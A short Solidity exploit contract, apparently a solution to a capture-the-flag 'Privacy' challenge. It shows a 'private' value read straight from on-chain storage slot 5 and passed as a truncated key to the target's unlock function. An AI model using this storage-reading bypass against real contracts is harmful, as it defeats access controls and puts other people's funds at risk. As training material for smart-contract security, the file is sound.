// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    constructor(Privacy privacy){
        /* by typing a command into browser console 'awiat web3.eth.getStorageAt(contract.address,  5  ) 
        *                                                                                /           \        
        *                                                                      address of contract    slot where data[2] is stored            
        *
        *we can see what the value of data[2] is '0x1478774943fe2e435be7e972c30fe0ac10fc600804f389cec63dec3e706ddd52'
        */
        bytes32 data2= 0x1478774943fe2e435be7e972c30fe0ac10fc600804f389cec63dec3e706ddd52;
        //converting value of data[2] to bytes16
        bytes16 key= bytes16(data2);
        privacy.unlock(key);
    }
}